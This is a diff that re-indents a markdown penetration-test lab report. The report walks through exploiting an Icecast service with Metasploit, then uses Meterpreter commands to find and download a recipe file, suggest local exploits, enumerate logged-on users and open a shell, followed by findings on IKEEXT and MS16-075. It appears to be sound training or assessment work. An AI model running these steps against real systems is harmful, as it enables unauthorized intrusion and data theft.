@@ -50,95 +50,95 @@ From the previous step, we see that the Icecast service is running. Let's start 
 
 - Run the SearchSploit commands to show available Icecast exploits.
 
-> **Answer:** searchsploit icecast
+   > **Answer:** searchsploit icecast
 
- ![searchsploit_icecast](Screenshots/searchsploit_icecast_command.png)
+   ![searchsploit_icecast](Screenshots/searchsploit_icecast_command.png)
 
 Now that we know which exploits are available to us, let's start Metasploit:
 
 - Run the command that starts Metasploit:
 
-> **Answer:** msfconsole
+   > **Answer:** msfconsole
 
- ![msfconsole](Screenshots/msfconsole_command.png)
+   ![msfconsole](Screenshots/msfconsole_command.png)
  
 Search for the Icecast module and load it for use.
 
 - Run the command to search for the Icecast module:
 
-> **Answer:** search icecast
+   > **Answer:** search icecast
 
- ![search_icecast](Screenshots/search_icecast_command.png)
+   ![search_icecast](Screenshots/search_icecast_command.png)
  
 - Run the command to use the Icecast module:
 
-> **Answer:** use 0
+   > **Answer:** use 0
 
- ![use](Screenshots/use_0_command.png)
+   ![use](Screenshots/use_0_command.png)
  
 - Run the command that sets the RHOST:
 
-> **Answer:** set RHOST 192.168.0.20
+   > **Answer:** set RHOST 192.168.0.20
 
- ![RHOST](Screenshots/use_rhost_command.png)
+   ![RHOST](Screenshots/use_rhost_command.png)
  
 - Run the command that runs the Icecast exploit.
 
-> **Answer:** exploit
+   > **Answer:** exploit
 
- ![exploit](Screenshots/exploit_command.png)
+   ![exploit](Screenshots/exploit_command.png)
  
 You should now have a Meterpreter session open.
 
 - Run the command that performs a search for the secretfile.txt on the target.
 
-> **Answer:** search -f *secretfile*.txt
+   > **Answer:** search -f *secretfile*.txt
 
- ![secretfile](Screenshots/secretfile_command.png)
+   ![secretfile](Screenshots/secretfile_command.png)
 
 - Run the command to performs a search for the recipe.txt on the target:
 
-> **Answer:** search -f *recipe*.txt
+   > **Answer:** search -f *recipe*.txt
 
- ![recipe](Screenshots/recipe_command.png)
+   ![recipe](Screenshots/recipe_command.png)
 
 - Run the command that ex-filtrates the recipe*.txt file:
 
-> **Answer:** download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’
+   > **Answer:** download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’
 
- ![exfiltrate](Screenshots/exfiltrate_recipe_command.png)
+   ![exfiltrate](Screenshots/exfiltrate_recipe_command.png)
 
 - Verify that you have successfully downloaded the file.
 
-> **Verification:**
+   > **Verification:**
 
- ![verification](Screenshots/verify_drinks.png) 
+   ![verification](Screenshots/verify_drinks.png) 
 
 You can also use Meterpreter's local exploit suggester to find possible exploits.
 
 - Run the command to use Meterpreter’s local exploit suggester.
 
-> **Answer:** run post/multi/recon/local_exploit_suggester
+  > **Answer:** run post/multi/recon/local_exploit_suggester
 
- ![exploit_suggestor](Screenshots/exfiltrate_recipe_command.png)
+  ![exploit_suggestor](Screenshots/exfiltrate_recipe_command.png)
 
 - Run a Meterpreter post script that enumerates all logged on users.
 
-> **Answer:** run post/windows/gather/enum_logged_on_users
+   > **Answer:** run post/windows/gather/enum_logged_on_users
 
- ![enum_users](Screenshots/logged_on_users_command.png)
+  ![enum_users](Screenshots/logged_on_users_command.png)
 
 - Run the command to open a Meterpreter shell and gather system information for the target.
 
-> **Answer:** shell
+   > **Answer:** shell
 
- ![shell](Screenshots/shell_command.png)
+   ![shell](Screenshots/shell_command.png)
 
 - Run the command that displays the target's computer system information:
 
-> **Answer:** systeminfo
+   > **Answer:** systeminfo
 
- ![systeminfo](Screenshots/systeminfo_command.png)
+   ![systeminfo](Screenshots/systeminfo_command.png)
 
 ### Separate findings for each vulnerability can be found below:
 
@@ -164,7 +164,7 @@ The severity of this vulnerability is Medium, with a CVSS score of 6.0.
 
 **Proof of Concept:** 
 
- ![ikeext_proof](Screenshots/ikeext_vulnerability.png)
+![ikeext_proof](Screenshots/ikeext_vulnerability.png)
 
 **Machine IP:**
 
@@ -188,7 +188,7 @@ The severity of this vulnerability is Medium, with a CVSS score of 6.9.
 
 **Proof of Concept:** 
 
- ![ms16_proof](Screenshots/ms16_075_reflection_vulnerability.png)
+![ms16_proof](Screenshots/ms16_075_reflection_vulnerability.png)
 
 ### 3.0 Recommendations
 
